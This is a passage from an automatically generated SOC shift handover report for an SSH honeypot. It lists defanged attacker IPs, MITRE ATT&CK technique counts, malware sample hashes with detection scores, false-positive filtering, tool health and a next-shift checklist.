| `92.205.56[.]196` | **3** | 2026-03-25 21:00 | 2026-03-25 21:08 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `47.83.161[.]4` | **2** | 2026-03-25 20:58 | 2026-03-25 21:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.94.81[.]187` | **2** | 2026-03-25 21:14 | 2026-03-25 21:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `74.249.128[.]83` | **2** | 2026-03-25 22:11 | 2026-03-25 22:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.69[.]201` | 1 | 2026-03-25 21:05 | 2026-03-25 21:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.22.231[.]62` | 1 | 2026-03-25 21:33 | 2026-03-25 21:33 | 5s | 0 | `T1592` | 🟢 LOW |
| `111.70.32[.]192` | 1 | 2026-03-25 22:16 | 2026-03-25 22:16 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.28.86[.]1` | 1 | 2026-03-25 21:42 | 2026-03-25 21:42 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.190.106[.]110` | 1 | 2026-03-25 20:47 | 2026-03-25 20:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.237.115[.]208` | 1 | 2026-03-25 22:10 | 2026-03-25 22:10 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.53[.]82` | 1 | 2026-03-25 20:47 | 2026-03-25 20:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.196.144[.]45` | 1 | 2026-03-25 22:23 | 2026-03-25 22:23 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.251.193[.]6` | 1 | 2026-03-25 20:40 | 2026-03-25 20:40 | 10s | 0 | `T1592` | 🟢 LOW |
| `199.36.77[.]212` | 1 | 2026-03-25 21:30 | 2026-03-25 21:30 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `213.234.9[.]218` | 1 | 2026-03-25 22:02 | 2026-03-25 22:02 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `31.173.0[.]46` | 1 | 2026-03-25 21:09 | 2026-03-25 21:09 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.103.222[.]120` | 1 | 2026-03-25 21:07 | 2026-03-25 21:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.167.250[.]45` | 1 | 2026-03-25 21:30 | 2026-03-25 21:30 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.153[.]61` | 1 | 2026-03-25 21:42 | 2026-03-25 21:42 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `84.219.213[.]67` | 1 | 2026-03-25 20:40 | 2026-03-25 20:40 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `86.33.164[.]77` | 1 | 2026-03-25 22:31 | 2026-03-25 22:31 | 9s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `111.70.32[.]192` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 4 |
| `113.28.86[.]1` | HK | BRIGHTEN INVESTMENT (HK) LIMITED | **100** ⚠️ | 50 |
| `8.222.187[.]152` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 39 |
| `47.238.164[.]111` | HK | ALIBABA CLOUD - HK | **100** ⚠️ | 6 |
| `151.237.115[.]208` | BG | Pronet Telecom Ltd. | **100** ⚠️ | 50 |
| `49.124.153[.]61` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 21 |
| `31.173.0[.]46` | RU | PJSC MegaFon | **100** ⚠️ | 33 |
| `36.103.222[.]120` | CN | CHINANET ningxia province network | **100** ⚠️ | 50 |
| `172.174.72[.]225` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `74.249.128[.]83` | US | Microsoft Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 67 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 45 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |

---

## 🔕 False Positive Summary (104 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 100 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 174 cases |
| Tool 34  | Credential Extractor        | ✅ 59 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 34 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 104 filtered (59.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 14 priority case(s) shown individually · 27 recon entry/entries in table (10 group(s) consolidating 39 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-25T22:34:34Z_
